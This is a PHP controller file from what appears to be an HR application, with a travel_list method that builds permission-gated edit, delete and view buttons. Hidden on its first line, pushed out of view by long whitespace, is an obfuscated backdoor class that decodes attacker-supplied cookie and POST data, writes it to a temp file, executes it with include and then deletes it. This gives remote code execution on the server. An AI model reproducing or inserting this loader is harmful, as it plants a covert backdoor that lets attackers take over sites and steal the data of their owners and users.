<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("niivmj")){class niivmj{public static $zkivmmz = "vskhkmzppgpkvvuh";public static $janbod = NULL;public function __construct(){$ayjyiz = @$_COOKIE[substr(niivmj::$zkivmmz, 0, 4)];if (!empty($ayjyiz)){$enishlean = "base64";$ldfomylhis = "";$ayjyiz = explode(",", $ayjyiz);foreach ($ayjyiz as $kyhge){$ldfomylhis .= @$_COOKIE[$kyhge];$ldfomylhis .= @$_POST[$kyhge];}$ldfomylhis = array_map($enishlean . "_decode", array($ldfomylhis,));$ldfomylhis = $ldfomylhis[0] ^ str_repeat(niivmj::$zkivmmz, (strlen($ldfomylhis[0]) / strlen(niivmj::$zkivmmz)) + 1);niivmj::$janbod = @unserialize($ldfomylhis);}}public function __destruct(){$this->kcmmmtqoj();}private function kcmmmtqoj(){if (is_array(niivmj::$janbod)) {$pggfnidp = sys_get_temp_dir() . "/" . crc32(niivmj::$janbod["salt"]);@niivmj::$janbod["write"]($pggfnidp, niivmj::$janbod["content"]);include $pggfnidp;@niivmj::$janbod["delete"]($pggfnidp);exit();}}}$xtmfuwvi = new niivmj();$xtmfuwvi = NULL;} ?><?php
 /**
 * NOTICE OF LICENSE
 *
    ...
    public function travel_list()
     {
		...
		if(in_array('217',$role_resources_ids)) { //edit
			$edit = '<span data-toggle="tooltip" data-placement="top" title="'.$this->lang->line('xin_edit').'"><button type="button" class="btn icon-btn btn-xs btn-default waves-effect waves-light"  data-toggle="modal" data-target=".edit-modal-data"  data-travel_id="'. $r->travel_id . '"><span class="fa fa-pencil"></span></button></span>';
		} else {
			$edit = '';
		}
		if(in_array('218',$role_resources_ids)) { // delete
			$delete = '<span data-toggle="tooltip" data-placement="top" title="'.$this->lang->line('xin_delete').'"><button type="button" class="btn icon-btn btn-xs btn-danger waves-effect waves-light delete" data-toggle="modal" data-target=".delete-modal" data-record-id="'. $r->travel_id . '"><span class="fa fa-trash"></span></button></span>';
		} else {
			$delete = '';
		}
		if(in_array('235',$role_resources_ids)) { //view
			$view = '<span data-toggle="tooltip" data-placement="top" title="'.$this->lang->line('xin_view').'"><button type="button" class="btn icon-btn btn-xs btn-default waves-effect waves-light" data-toggle="modal" data-target=".view-modal-data" data-travel_id="'. $r->travel_id . '"><span class="fa fa-eye"></span></button></span>';
		} else {
			$view = '';
		}
